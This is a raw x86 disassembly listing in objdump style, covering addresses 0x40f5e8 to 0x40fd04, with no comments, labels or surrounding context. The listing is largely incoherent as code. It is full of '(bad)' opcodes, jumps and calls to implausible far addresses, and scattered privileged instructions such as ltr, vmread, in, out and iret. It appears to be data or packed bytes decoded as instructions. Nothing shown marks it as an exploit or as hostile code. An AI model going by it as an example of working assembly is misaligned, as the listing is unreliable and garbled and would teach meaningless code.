  40f5e8:	mov    ecx,ecx
  40f5ea:	loopne 0x40f571
  40f5ec:	mov    DWORD PTR [edx],0x4d8b00c3
  40f5f2:	sbb    al,0x8b
  40f5f4:	out    dx,al
  40f5f5:	mov    eax,DWORD PTR [eax]
  40f5f7:	push   eax
  40f5f8:	push   eax
  40f5f9:	test   DWORD PTR [ebp-0x1],eax
  40f5fc:	mov    edi,edi
  40f5fe:	cwde   
  40f5ff:	inc    ebp
  40f600:	add    BYTE PTR [ebx],dh
  40f602:	mov    DWORD PTR [ebx],0x24ff8918
  40f608:	add    al,0xff
  40f60a:	add    BYTE PTR [ebx-0x5ae30f77],cl
  40f610:	(bad)  
  40f611:	(bad)  
  40f612:	(bad)  
  40f613:	(bad)  
  40f614:	push   DWORD PTR [ebx]
  40f616:	or     BYTE PTR [ebx],al
  40f618:	ror    BYTE PTR [ecx-0xbad7d0],0x83
  40f61f:	(bad)  
  40f620:	cld    
  40f621:	sbb    BYTE PTR [ebx+0x765050ff],al
  40f627:	inc    ebp
  40f628:	mov    esi,DWORD PTR [ebx]
  40f62a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f62b:	add    ecx,esi
  40f62d:	push   eax
  40f62e:	mov    BYTE PTR [ebp+0x4d],0x5
  40f632:	jmp    0x40f634
  40f634:	mov    eax,DWORD PTR [eax]
  40f636:	clc    
  40f637:	mov    ecx,DWORD PTR [esp+ebx*1]
  40f63a:	inc    DWORD PTR [eax+0x5501fc]
  40f640:	mov    BYTE PTR [ebp-0xe70075],al
  40f646:	cmp    eax,DWORD PTR [eax]
  40f648:	push   eax
  40f649:	add    cl,ch
  40f64b:	xor    BYTE PTR [esi+0x4d],cl
  40f64e:	add    edi,edi
  40f650:	mov    ecx,DWORD PTR [eax]
  40f652:	mov    al,ds:0x8b8b004d
  40f657:	mov    ebp,DWORD PTR [ebx]
  40f659:	hlt    
  40f65a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f65b:	add    dh,al
  40f65d:	add    DWORD PTR [ebp+0x45],edx
  40f660:	mov    ecx,DWORD PTR [ecx+0x18d68b28]
  40f666:	dec    ebp
  40f667:	inc    eax
  40f668:	mov    DWORD PTR [ecx-0xbadf1c],ecx
  40f66e:	add    BYTE PTR [ebx-0x38162400],cl
  40f674:	add    bl,al
  40f676:	add    BYTE PTR [ebp-0x2e003e],al
  40f67c:	mov    DWORD PTR [ebp-0x10],eax
  40f67f:	mov    DWORD PTR [ebp+0x28],esp
  40f682:	push   eax
  40f683:	dec    DWORD PTR [ecx+0x5518e88d]
  40f689:	dec    DWORD PTR [ecx+0x5545f050]
  40f68f:	xor    ecx,DWORD PTR [edi]
  40f691:	add    edx,DWORD PTR [edx]
  40f693:	push   eax
  40f694:	xchg   ebp,eax
  40f695:	inc    ebp
  40f696:	inc    DWORD PTR ds:0xe200ff
  40f69c:	jnp    0x809612a2
  40f6a2:	mov    eax,DWORD PTR [ecx]
  40f6a4:	pusha  
  40f6a5:	add    bh,bh
  40f6a7:	test   ecx,eax
  40f6a9:	dec    DWORD PTR [edi+edi*8]
  40f6ac:	ret    0x8d00
  40f6af:	add    bh,bh
  40f6b1:	mov    ch,0xd7
  40f6b3:	(bad)  
  40f6b4:	cli    
  40f6b5:	inc    DWORD PTR [ebp+0x2255f830]
  40f6bb:	test   DWORD PTR [ebp+0x74],ecx
  40f6be:	add    ecx,DWORD PTR [ebx+0x65a01889]
  40f6c4:	or     BYTE PTR [eax],al
  40f6c6:	cmp    DWORD PTR [eax+0x74],edi
  40f6c9:	add    BYTE PTR [ebx+0x114dfc23],cl
  40f6cf:	sub    eax,DWORD PTR [eax]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x77]
  40f6d4:	mov    eax,edi
  40f6d6:	add    DWORD PTR [ebx],eax
  40f6d8:	inc    ebp
  40f6d9:	dec    ebp
  40f6da:	mov    ecx,DWORD PTR [edx+0x45450118]
  40f6e0:	add    cl,BYTE PTR [ebx+0x875fc4d]
  40f6e6:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e9:	inc    eax
  40f6ea:	push   ebp
  40f6eb:	push   ecx
  40f6ec:	mov    esi,DWORD PTR [edx-0x14]
  40f6ef:	mov    edx,DWORD PTR [ecx+0xce003c]
  40f6f5:	adc    DWORD PTR [eax+eax*1],0xd68b0045
  40f6fc:	add    al,0x55
  40f6fe:	push   ebp
  40f6ff:	add    ecx,DWORD PTR [ecx-0x2d030777]
  40f705:	push   ecx
  40f706:	test   DWORD PTR [ebx],eax
  40f708:	dec    DWORD PTR [ecx+0x554518ff]
  40f70e:	mov    edi,eax
  40f710:	sbb    al,0xec
  40f712:	inc    DWORD PTR [eax]
  40f714:	mov    DWORD PTR [eax],0xff8318
  40f71a:	add    al,0x83
  40f71c:	add    al,bh
  40f71e:	mov    ebp,edx
  40f720:	push   eax
  40f721:	push   ebp
  40f722:	test   DWORD PTR [edi+edi*8-0x73],esi
  40f726:	dec    DWORD PTR [eax]
  40f728:	inc    ebp
  40f729:	push   ebp
  40f72a:	xor    ecx,DWORD PTR [ebx+0x5589f003]
  40f730:	and    al,0x8b
  40f732:	(bad)  
  40f733:	call   0x89ddaec5
  40f738:	test   DWORD PTR [eax-0x1],esp
  40f73b:	(bad)  
  40f73c:	inc    DWORD PTR [ecx+0xffff85]
  40f742:	dec    DWORD PTR [ecx-0x6a1f5f75]
  40f748:	(bad)  
  40f749:	inc    ebx
  40f74b:	dec    DWORD PTR [ebx-0x117ee316]
  40f751:	arpl   WORD PTR [eax],ax
  40f753:	int    0x50
  40f755:	xor    eax,DWORD PTR [ebp-0x7f]
  40f758:	mov    esi,DWORD PTR [eax]
  40f75a:	cwde   
  40f75b:	pushf  
  40f75c:	add    BYTE PTR [ebp-0x1],dh
  40f75f:	mov    edi,edi
  40f761:	mov    al,ds:0x4d45ce08
  40f766:	inc    DWORD PTR [ebx]
  40f768:	adc    al,0x83
  40f76a:	add    BYTE PTR [eax],0x1
  40f76d:	adc    BYTE PTR [eax],al
  40f76f:	push   ebp
  40f770:	inc    ebp
  40f771:	add    edi,edi
  40f773:	mov    edx,DWORD PTR [eax]
  40f775:	mov    ecx,DWORD PTR [ebp-0x60]
  40f778:	push   esi
  40f779:	adc    al,0x8
  40f77b:	mov    edx,DWORD PTR [ebp-0x8]
  40f77e:	mov    ecx,DWORD PTR [ebp-0x4]
  40f781:	add    DWORD PTR [ebp-0x18],0xffffff8d
  40f785:	inc    DWORD PTR [eax+esi*8]
  40f788:	inc    ebp
  40f789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f78a:	mov    edx,DWORD PTR [ebp+0x1c]
  40f78d:	add    DWORD PTR [ebp-0x14],eax
  40f790:	mov    edx,DWORD PTR [ebp-0x70]
  40f793:	cmp    eax,DWORD PTR [eax]
  40f795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f796:	mov    eax,DWORD PTR [eax]
  40f798:	sbb    al,0x73
  40f79a:	add    BYTE PTR [ebx],0x1
  40f79d:	hlt    
  40f79e:	add    BYTE PTR [eax+0x30],dl
  40f7a1:	mov    DWORD PTR [ecx],esi
  40f7a3:	hlt    
  40f7a4:	pop    ds
  40f7a5:	inc    ebp
  40f7a6:	xor    al,BYTE PTR [ebp+0x6c760f3a]
  40f7ac:	(bad)  
  40f7ad:	push   DWORD PTR [edi]
  40f7af:	mov    ecx,DWORD PTR [ebx+0x398503a4]
  40f7b5:	push   DWORD PTR [ebx-0x1]
  40f7b8:	mov    eax,DWORD PTR [ebp-0x740075]
  40f7be:	sub    eax,DWORD PTR [eax]
  40f7c0:	add    eax,DWORD PTR [eax]
  40f7c2:	mov    DWORD PTR [ecx+0x5f],eax
  40f7c5:	mov    DWORD PTR [ebx+0x20],ebx
  40f7c8:	ret    0xff
  40f7cb:	mov    ecx,DWORD PTR [ebx+0x1cc783dc]
  40f7d1:	ret    
  40f7d2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f7d8:	add    BYTE PTR [ebp-0x7d],al
  40f7db:	mov    DWORD PTR [eax],eax
  40f7dd:	sub    BYTE PTR [edi+edi*8+0x18008d01],al
  40f7e4:	sar    bh,cl
  40f7e6:	test   BYTE PTR [eax+0x1],dl
  40f7e9:	inc    ebp
  40f7ea:	add    BYTE PTR [ebx],dh
  40f7ec:	test   BYTE PTR [ebx],0x84
  40f7ef:	push   eax
  40f7f0:	add    BYTE PTR [ebp+0x0],al
  40f7f3:	add    eax,0x86
  40f7f8:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f7fe:	add    BYTE PTR [ecx],al
  40f800:	add    BYTE PTR [eax],al
  40f802:	mov    esi,0x550030
  40f807:	mov    ecx,DWORD PTR [edi]
  40f809:	sbb    al,0xda
  40f80b:	jne    0x40f80d
  40f80d:	mov    edi,DWORD PTR [ecx]
  40f80f:	xor    BYTE PTR [eax+eax*1],0x84
  40f813:	add    eax,DWORD PTR [eax]
  40f815:	cld    
  40f816:	add    BYTE PTR [ebp-0x4f],dh
  40f819:	mov    eax,DWORD PTR [ecx]
  40f81b:	cld    
  40f81c:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f822:	retf   0xe45
  40f825:	add    eax,edx
  40f827:	sbb    al,0xb7
  40f829:	dec    ebp
  40f82a:	or     al,0x89
  40f82c:	dec    ebp
  40f82d:	sbb    al,0xf
  40f82f:	inc    ebp
  40f830:	dec    eax
  40f831:	mov    eax,DWORD PTR [ebx]
  40f833:	sbb    al,0xf
  40f835:	nop
  40f836:	scas   al,BYTE PTR es:[edi]
  40f837:	add    DWORD PTR [eax],eax
  40f839:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f83f:	mov    eax,gs
  40f841:	add    bh,bh
  40f843:	mov    edi,edi
  40f845:	cmp    DWORD PTR [edi+0x72],edx
  40f848:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f84e:	gs cmp al,0x0
  40f851:	je     0x40f829
  40f853:	push   eax
  40f854:	sar    BYTE PTR [eax],1
  40f856:	mov    bh,0x3e
  40f858:	push   cs
  40f859:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f85f:	add    DWORD PTR [ecx+0x12],ebp
  40f862:	dec    edx
  40f863:	(bad)  
  40f864:	mov    eax,edx
  40f866:	in     al,dx
  40f867:	adc    DWORD PTR [ecx],esi
  40f869:	pop    esi
  40f86a:	inc    ecx
  40f86b:	leave  
  40f86c:	or     DWORD PTR [eax],ebx
  40f86e:	gs push ebp
  40f870:	add    ah,ch
  40f872:	into   
  40f873:	in     al,dx
  40f874:	enter  0xb756,0xf0
  40f878:	push   cs
  40f879:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f883:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f889:	jnp    0x74417d91
  40f88f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f895:	add    BYTE PTR [edi],cl
  40f897:	mov    edi,DWORD PTR [ecx-0x78]
  40f89a:	ltr    WORD PTR [ecx-0x7b]
  40f89e:	dec    DWORD PTR [edi]
  40f8a0:	clc    
  40f8a1:	out    0x45,eax
  40f8a3:	add    BYTE PTR [eax],cl
  40f8a5:	cmp    ebx,0xffffff8c
  40f8a8:	jge    0x40f8aa
  40f8aa:	jb     0x40f8bc
  40f8ac:	je     0x4ff92c
  40f8b2:	pop    edx
  40f8b3:	push   esi
  40f8b4:	mov    ecx,DWORD PTR [edi]
  40f8b6:	in     al,dx
  40f8b7:	rol    DWORD PTR [ebp+0x0],1
  40f8ba:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f8c1:	cmp    DWORD PTR [ecx],0xfffffff0
  40f8c4:	hlt    
  40f8c5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f8cb:	(bad)  
  40f8cd:	push   eax
  40f8ce:	jns    0xb840dd4c
  40f8d4:	lock push cs
  40f8d6:	ror    edx,0x3
  40f8d9:	test   BYTE PTR [ecx+0x5500e800],cl
  40f8df:	dec    eax
  40f8e0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f8e4:	(bad)  
  40f8e5:	mov    esi,0x7f33ff5f
  40f8ea:	inc    eax
  40f8eb:	test   DWORD PTR [edx],eax
  40f8ed:	je     0x40f8af
  40f8ef:	mov    ecx,ecx
  40f8f1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f8f5:	and    eax,DWORD PTR [eax+0xf0103]
  40f8fb:	jp     0x40f8e9
  40f8fd:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f901:	add    edx,DWORD PTR [edi+0x74]
  40f904:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f90a:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f910:	je     0x40f895
  40f912:	cmp    eax,edi
  40f914:	js     0x40f939
  40f916:	add    eax,0xeb0fc003
  40f91b:	jns    0x40f8a8
  40f91d:	vmread DWORD PTR [ecx+0x45],ebx
  40f921:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f927:	adc    al,0x8b
  40f929:	jge    0x40f93f
  40f92b:	mov    edi,DWORD PTR [eax-0x4]
  40f92e:	add    edi,DWORD PTR [edi]
  40f930:	or     bh,bh
  40f932:	push   ebp
  40f933:	push   es
  40f934:	mov    DWORD PTR [ebp-0x4],ebx
  40f937:	add    edi,esi
  40f939:	pop    es
  40f93a:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f940:	mov    DWORD PTR [esp+esi*8],ecx
  40f943:	inc    ebp
  40f944:	pop    ebp
  40f945:	xor    DWORD PTR [esi-0x4],0x3b
  40f949:	add    edx,DWORD PTR [ecx+edi*1]
  40f94c:	push   es
  40f94d:	clc    
  40f94e:	mov    bh,0xdb
  40f950:	jp     0x40f909
  40f952:	add    cl,BYTE PTR [esi]
  40f954:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f95a:	test   edi,edi
  40f95c:	je     0x40f952
  40f95e:	mov    eax,ecx
  40f960:	or     BYTE PTR [ebx],al
  40f962:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f968:	jbe    0x40f9dc
  40f96a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f970:	add    ecx,DWORD PTR [esi]
  40f972:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f978:	add    eax,DWORD PTR [ebx-0x287af783]
  40f97e:	je     0x40f9cd
  40f980:	mov    DWORD PTR [ecx],edi
  40f982:	mov    esi,eax
  40f984:	hlt    
  40f985:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f98c:	jb     0x40f94e
  40f98e:	jmp    0x40f97b
  40f990:	xor    esi,DWORD PTR [ebx]
  40f992:	pop    edi
  40f993:	pop    esi
  40f994:	pop    ebx
  40f995:	ret    
  40f996:	ret    0x8b
  40f999:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f99f:	xor    DWORD PTR ds:0x89339c0c,0x56
  40f9a6:	cld    
  40f9a7:	cmp    DWORD PTR [ebp+0xf],eax
  40f9aa:	xor    al,BYTE PTR [ebp-0x7474ff64]
  40f9b0:	cld    
  40f9b1:	or     al,0x4d
  40f9b3:	ret    
  40f9b4:	mov    edi,DWORD PTR [esi-0x4]
  40f9b7:	pop    eax
  40f9b8:	dec    ebp
  40f9b9:	jne    0x40f946
  40f9bb:	xor    edi,esp
  40f9bd:	inc    eax
  40f9be:	dec    ebp
  40f9bf:	jbe    0x40fa14
  40f9c1:	inc    eax
  40f9c2:	pop    ebp
  40f9c3:	add    edx,DWORD PTR [esi+0x8]
  40f9c6:	push   esi
  40f9c7:	dec    eax
  40f9c8:	push   ecx
  40f9c9:	mov    eax,edi
  40f9cb:	and    al,0xf0
  40f9cd:	jo     0x40f9ba
  40f9cf:	mov    eax,DWORD PTR [ebx]
  40f9d1:	sbb    BYTE PTR [ebp+0x4d],cl
  40f9d4:	mov    eax,DWORD PTR [ebx]
  40f9d6:	nop
  40f9d7:	or     BYTE PTR [eax],al
  40f9d9:	jne    0x40fa32
  40f9db:	cmp    ebx,DWORD PTR [ebp+0x33893277]
  40f9e1:	cld    
  40f9e2:	xor    edi,edi
  40f9e4:	add    edi,DWORD PTR [ebp+0x3]
  40f9e7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f9ed:	js     0x40f973
  40f9ef:	jae    0x40f9f3
  40f9f1:	(bad)  
  40f9f3:	xor    al,0x5d
  40f9f5:	jmp    0x40f982
  40f9f7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f9fe:	fdecstp 
  40fa00:	test   BYTE PTR [edi],ah
  40fa02:	add    bh,BYTE PTR [ebp+0x0]
  40fa05:	add    ebx,DWORD PTR [ebp-0x77]
  40fa08:	mov    edi,eax
  40fa0a:	cmp    al,0x0
  40fa0d:	adc    dh,BYTE PTR [ebx]
  40fa0f:	jge    0x40fa14
  40fa11:	mov    edi,DWORD PTR [ebx]
  40fa13:	jl     0x40fa24
  40fa15:	clc    
  40fa16:	dec    edi
  40fa17:	jge    0x40fa19
  40fa19:	mov    eax,DWORD PTR [ebx]
  40fa1b:	jb     0x40fa25
  40fa1d:	mov    ecx,DWORD PTR [ebp-0x8]
  40fa20:	mov    edi,edi
  40fa22:	xor    edx,DWORD PTR [eax]
  40fa24:	add    edi,DWORD PTR [ebx]
  40fa26:	mov    DWORD PTR [ebp-0x10],edi
  40fa29:	inc    edi
  40fa2a:	pop    ebp
  40fa2b:	jge    0x40fa68
  40fa2d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40fa31:	mov    edx,0xc05d87f0
  40fa36:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40fa3a:	fimul  WORD PTR [eax]
  40fa3c:	fist   WORD PTR [ebp+0x1c]
  40fa3f:	in     al,dx
  40fa40:	jne    0x40fa2e
  40fa42:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40fa48:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40fa4c:	fdivp  st(0),st
  40fa4e:	fild   WORD PTR [ebp+0x4510f85c]
  40fa54:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40fa5a:	inc    ebp
  40fa5b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40fa61:	mov    ebp,DWORD PTR [ebx-0x4]
  40fa64:	adc    al,0x8b
  40fa66:	rcl    DWORD PTR [eax],0x48
  40fa69:	mov    esi,0x7080803
  40fa6e:	fiadd  WORD PTR [ebp+0x4d]
  40fa71:	(bad)  
  40fa72:	mov    edx,DWORD PTR [edx-0x4]
  40fa75:	mov    edx,DWORD PTR [ebp-0x4]
  40fa78:	xor    ebx,DWORD PTR [ebx+0x330103]
  40fa7e:	mov    DWORD PTR [edi+0x872dc],edi
  40fa84:	xlat   BYTE PTR ds:[ebx]
  40fa85:	into   
  40fa86:	ffreep st(6)
  40fa88:	retf   0x6c7
  40fa8b:	iret   
  40fa8c:	dec    ebp
  40fa8d:	inc    ebp
  40fa8e:	mov    DWORD PTR [ebx],edi
  40fa90:	fmul   QWORD PTR [edi]
  40fa92:	dec    ebp
  40fa93:	jnp    0x40fac8
  40fa95:	add    BYTE PTR [ebx],al
  40fa97:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa9a:	inc    ebp
  40fa9b:	dec    ebp
  40fa9c:	lea    esi,[ebx]
  40fa9e:	add    DWORD PTR [ebx],eax
  40faa0:	jb     0x40fadd
  40faa2:	add    BYTE PTR [edi],cl
  40faa4:	inc    ebp
  40faa5:	imul   eax,edi,0x858bd800
  40faab:	cld    
  40faac:	clc    
  40faad:	mov    DWORD PTR [ebp+0x0],eax
  40fab0:	inc    DWORD PTR [eax]
  40fab2:	or     al,0xde
  40fab4:	sbb    bh,0x1
  40fab7:	retf   
  40fab8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40fabf:	dec    ebp
  40fac0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40fac6:	enter  0x12de,0xdf
  40faca:	inc    ebp
  40facb:	pop    ebp
  40facc:	dec    DWORD PTR [ebx-0x257f0ff4]
  40fad2:	add    DWORD PTR [edx],edx
  40fad4:	add    BYTE PTR [ebp+0x50],dl
  40fad7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40fadd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40fae3:	or     ah,al
  40fae5:	pop    ss
  40fae6:	cdq    
  40fae7:	push   ebp
  40fae8:	clc    
  40fae9:	mov    eax,DWORD PTR [ebp-0x4]
  40faec:	xor    edx,edx
  40faee:	add    esi,DWORD PTR [ebx]
  40faf0:	cmp    eax,DWORD PTR [ebx]
  40faf2:	hlt    
  40faf3:	cmp    DWORD PTR [ebx],esp
  40faf5:	or     al,BYTE PTR [ebp+0xf]
  40faf8:	mov    eax,DWORD PTR [edx]
  40fafa:	loopne 0x40fafc
  40fafc:	(bad)  
  40fafd:	mov    ecx,esi
  40faff:	cld    
  40fb00:	pushf  
  40fb01:	pop    ebp
  40fb02:	popf   
  40fb03:	mov    esi,DWORD PTR [edx]
  40fb05:	lock mov eax,eax
  40fb08:	adc    BYTE PTR [ebx],al
  40fb0a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40fb11:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40fb17:	dec    ebp
  40fb18:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40fb1e:	(bad)  
  40fb1f:	iret   
  40fb20:	inc    ebp
  40fb21:	(bad)  
  40fb22:	jne    0x40fb71
  40fb24:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40fb2a:	(bad)  
  40fb2b:	cmp    ebx,eax
  40fb2d:	je     0x40fab5
  40fb2f:	add    edi,edi
  40fb31:	or     bh,bh
  40fb33:	dec    ebp
  40fb34:	inc    ebp
  40fb35:	mov    esi,DWORD PTR [ebx]
  40fb37:	cld    
  40fb38:	add    ecx,esi
  40fb3a:	cmp    ecx,DWORD PTR [eax-0xc]
  40fb3d:	mov    edx,DWORD PTR [edi]
  40fb3f:	or     BYTE PTR [ebp-0x7c],al
  40fb42:	mov    ebx,DWORD PTR [ebp-0x7639cd18]
  40fb48:	test   BYTE PTR [ebx*4-0x76c1cdbb],cl
  40fb4f:	pushf  
  40fb50:	call   0x51eae0
  40fb55:	jne    0x40fb1e
  40fb57:	mov    ebp,esp
  40fb59:	fcomp  DWORD PTR [ebx]
  40fb5b:	add    BYTE PTR [ecx],al
  40fb5d:	inc    DWORD PTR [ebp-0x75]
  40fb60:	(bad)  
  40fb61:	cld    
  40fb62:	add    al,0xce
  40fb64:	mov    ecx,edi
  40fb66:	cld    
  40fb67:	inc    ebp
  40fb68:	fidivr WORD PTR [ebx]
  40fb6a:	fbstp  TBYTE PTR [ebp-0x3e]
  40fb6d:	mov    eax,DWORD PTR [eax]
  40fb6f:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fb75:	fadd   st,st(7)
  40fb77:	add    BYTE PTR [ebp-0x1],al
  40fb7a:	mov    ecx,DWORD PTR [esp+edi*8]
  40fb7d:	inc    ebp
  40fb7e:	mov    bh,0xc7
  40fb81:	loopne 0x40fbc8
  40fb83:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fb89:	sbb    dh,BYTE PTR [ebx]
  40fb8b:	pushf  
  40fb8c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fb92:	mov    eax,edi
  40fb94:	cwde   
  40fb95:	inc    ebp
  40fb96:	inc    ebp
  40fb97:	jne    0x40fb24
  40fb99:	mov    esp,esp
  40fb9b:	clc    
  40fb9c:	add    al,0x4d
  40fb9e:	mov    DWORD PTR [ebx],esi
  40fba0:	or     al,0x33
  40fba2:	inc    ebp
  40fba3:	lea    ecx,[ebx-0x398d13fd]
  40fba9:	add    bh,al
  40fbab:	inc    ebp
  40fbac:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fbb3:	add    ebp,esp
  40fbb5:	shufps xmm1,xmm3,0xc7
  40fbb9:	(bad)  
  40fbba:	jmp    0x748636e3
  40fbbf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fbc5:	hlt    
  40fbc6:	mov    ecx,DWORD PTR [edi]
  40fbc8:	fadd   DWORD PTR [ebp+0x0]
  40fbcb:	xor    ecx,DWORD PTR [edi]
  40fbcd:	add    ecx,ecx
  40fbcf:	cmp    edi,edi
  40fbd1:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fbd5:	(bad)  
  40fbd6:	jmp    0x40fb63
  40fbd8:	mov    edi,esp
  40fbda:	or     al,0xc6
  40fbdc:	inc    ebp
  40fbdd:	(bad)  
  40fbde:	mov    eax,DWORD PTR [ebp+0x10]
  40fbe1:	jne    0x40fb6c
  40fbe3:	mov    eax,DWORD PTR [ecx]
  40fbe5:	clc    
  40fbe6:	add    BYTE PTR [ebp-0x40],cl
  40fbe9:	xor    edx,DWORD PTR [eax-0x73]
  40fbec:	jne    0x40fbef
  40fbee:	push   DWORD PTR [edx+0x8]
  40fbf1:	add    BYTE PTR [ebp+0x45],al
  40fbf4:	mov    ebp,ecx
  40fbf6:	cld    
  40fbf7:	add    BYTE PTR [ebp+0x0],cl
  40fbfa:	xor    eax,DWORD PTR [ebp+0x3]
  40fbfd:	lea    edi,[ebx]
  40fbff:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40fc05:	sub    eax,0x5d330e4d
  40fc0a:	lea    esi,[ebx]
  40fc0c:	add    DWORD PTR [ebx],eax
  40fc0e:	jb     0x40fbf9
  40fc10:	add    BYTE PTR [eax],al
  40fc12:	inc    ebp
  40fc13:	add    bl,ch
  40fc15:	inc    ebp
  40fc16:	mov    esi,DWORD PTR [ebx]
  40fc18:	or     al,0x3
  40fc1a:	(bad)  
  40fc1b:	mov    edi,eax
  40fc1d:	in     al,dx
  40fc1e:	scas   eax,DWORD PTR es:[edi]
  40fc1f:	inc    ebp
  40fc20:	mov    esi,DWORD PTR [ebx]
  40fc22:	in     al,0x3
  40fc24:	add    al,0x89
  40fc26:	mov    ecx,DWORD PTR [eax+edi*8]
  40fc29:	dec    ebp
  40fc2a:	(bad)  
  40fc2b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3163]
  40fc32:	mov    ecx,eax
  40fc34:	cld    
  40fc35:	push   es
  40fc36:	dec    ebp
  40fc37:	add    al,0x33
  40fc39:	mov    DWORD PTR [ebx],eax
  40fc3b:	in     al,dx
  40fc3c:	cmp    DWORD PTR [ebp-0x67],eax
  40fc3f:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fc45:	mov    edx,DWORD PTR [ebp-0x4]
  40fc48:	mov    ecx,DWORD PTR [ebp-0x18]
  40fc4b:	xor    ecx,DWORD PTR [ebp+0x3]
  40fc4e:	cmp    DWORD PTR [ebx],0x8b32749c
  40fc54:	xor    edi,esp
  40fc56:	jmp    0xff74f9a8
  40fc5b:	add    ecx,DWORD PTR [ebp-0x3f]
  40fc5e:	xor    ebx,DWORD PTR [edi]
  40fc60:	add    eax,ecx
  40fc62:	cmp    ebx,DWORD PTR [eax]
  40fc64:	mov    ecx,DWORD PTR [ebp-0x4]
  40fc67:	mov    ecx,DWORD PTR [eax]
  40fc69:	adc    BYTE PTR [ebp-0x80],al
  40fc6c:	jmp    0x40fc6f
  40fc6e:	mov    eax,DWORD PTR [eax]
  40fc70:	cld    
  40fc71:	mov    bh,0xc6
  40fc73:	push   ecx
  40fc74:	(bad)  
  40fc75:	jne    0x40fcd5
  40fc77:	dec    ecx
  40fc79:	or     BYTE PTR [ecx+ebx*1],cl
  40fc7c:	push   ebp
  40fc7d:	inc    ebp
  40fc7e:	in     al,dx
  40fc7f:	add    ebp,esp
  40fc81:	or     bh,al
  40fc83:	dec    ebp
  40fc84:	cld    
  40fc85:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fc8b:	xor    DWORD PTR [edx],0x2
  40fc8e:	pushf  
  40fc8f:	dec    DWORD PTR [ebx+0x45510cf4]
  40fc95:	mov    DWORD PTR [ebx+0x5645fc0c],ecx
  40fc9b:	mov    edx,DWORD PTR [ecx+0xc]
  40fc9e:	xor    eax,esi
  40fca0:	mov    edx,0xc172c7
  40fca5:	inc    ebp
  40fca6:	mov    esi,DWORD PTR [ebp+0x8]
  40fca9:	mov    eax,edx
  40fcab:	call   0x84c5c3a0
  40fcb0:	add    DWORD PTR [ebp-0x76bace00],ebx
  40fcb6:	mov    ebp,eax
  40fcb8:	or     BYTE PTR [eax],dl
  40fcba:	jo     0x40fd09
  40fcbc:	push   edi
  40fcbd:	xor    esi,DWORD PTR [ebp+0x3]
  40fcc0:	(bad)  
  40fcc1:	pmulhuw mm0,mm1
  40fcc4:	test   DWORD PTR [ebp-0x8],ecx
  40fcc7:	mov    DWORD PTR [ebp-0x67],eax
  40fcca:	mov    eax,DWORD PTR [ebp-0x4]
  40fccd:	xor    edi,DWORD PTR [ebp-0x73]
  40fcd0:	xor    eax,DWORD PTR [ebx]
  40fcd2:	xor    esi,DWORD PTR [edx+0x3]
  40fcd5:	add    BYTE PTR [ecx],bh
  40fcd7:	inc    ebp
  40fcd8:	(bad)  
  40fcd9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fcdf:	mov    DWORD PTR [eax],0x750f0004
  40fce5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fceb:	lock add BYTE PTR [ebp+0x0],al
  40fcef:	mov    esi,DWORD PTR [ebp-0x2c]
  40fcf2:	mov    ebp,edx
  40fcf4:	or     al,0x72
  40fcf6:	ja     0x40fcf8
  40fcf8:	mov    edx,esi
  40fcfa:	cld    
  40fcfb:	(bad)  
  40fcfe:	cli    
  40fcff:	mov    esi,DWORD PTR [ebp-0x4]
  40fd02:	cmp    ecx,esi
  40fd04:	bswap  edi
